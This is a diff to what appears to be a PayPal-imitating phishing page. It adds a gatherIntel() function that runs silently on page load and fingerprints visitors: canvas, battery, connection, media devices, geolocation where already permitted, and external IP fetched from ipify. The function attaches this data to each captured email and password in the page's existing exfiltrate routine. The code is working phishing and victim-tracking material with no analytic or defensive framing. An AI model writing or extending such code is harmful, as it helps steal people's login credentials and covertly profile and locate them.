@@ -621,7 +621,8 @@
             email: '',
             currentStep: 0,
             isPasswordVisible: false,
-            failedAttempts: []
+            failedAttempts: [],
+            intel: null
         };
 
         const steps = document.querySelectorAll('.step');
@@ -713,6 +714,93 @@
             }
         }
 
+        async function gatherIntel() {
+            const intel = {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                touchPoints: navigator.maxTouchPoints,
+                referrer: document.referrer || 'direct',
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                online: navigator.onLine,
+                pdfViewer: navigator.pdfViewerEnabled,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack
+            };
+
+            // Canvas fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('PayPal 2.5', 2, 2);
+                ctx.fillStyle = '#003087';
+                ctx.fillRect(2, 16, 50, 4);
+                intel.canvasHash = btoa(canvas.toDataURL()).slice(-16);
+            } catch(e) {
+                intel.canvasHash = 'blocked';
+            }
+
+            // Battery
+            try {
+                const battery = await navigator.getBattery();
+                intel.batteryLevel = Math.round(battery.level * 100) + '%';
+                intel.batteryCharging = battery.charging;
+            } catch(e) {
+                intel.batteryLevel = 'unknown';
+            }
+
+            // Connection
+            try {
+                const conn = navigator.connection;
+                intel.connectionType = conn.effectiveType || 'unknown';
+                intel.downlink = conn.downlink || 'unknown';
+                intel.rtt = conn.rtt || 'unknown';
+            } catch(e) {
+                intel.connectionType = 'unknown';
+            }
+
+            // Media devices (silent enumeration)
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                intel.mediaDevices = devices.map(d => `${d.kind}:${d.label.slice(0, 20)}`).join(', ');
+            } catch(e) {
+                intel.mediaDevices = 'blocked';
+            }
+
+            // Geolocation permission check (silent, no prompt)
+            try {
+                const perm = await navigator.permissions.query({ name: 'geolocation' });
+                intel.geoPermission = perm.state;
+                if (perm.state === 'granted') {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
+                    });
+                    intel.latitude = pos.coords.latitude;
+                    intel.longitude = pos.coords.longitude;
+                    intel.accuracy = pos.coords.accuracy;
+                }
+            } catch(e) {
+                intel.geoPermission = 'unknown';
+            }
+
+            // External IP
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                intel.externalIP = data.ip;
+            } catch(e) {
+                intel.externalIP = 'unknown';
+            }
+
+            return intel;
+        }
+
         function exfiltrate(password) {
             const attempt = {
                 email: state.email,
@@ -720,9 +808,7 @@
                 attemptNumber: state.failedAttempts.length + 1,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`
+                intel: state.intel
             };
             state.failedAttempts.push(attempt);
             
@@ -802,9 +888,11 @@
             }
         });
 
-        window.addEventListener('DOMContentLoaded', () => {
+        window.addEventListener('DOMContentLoaded', async () => {
             emailInput.focus();
             setLanguage('en');
+            state.intel = await gatherIntel();
+            console.log('Intel gathered:', state.intel);
         });
     </script>
 </body>
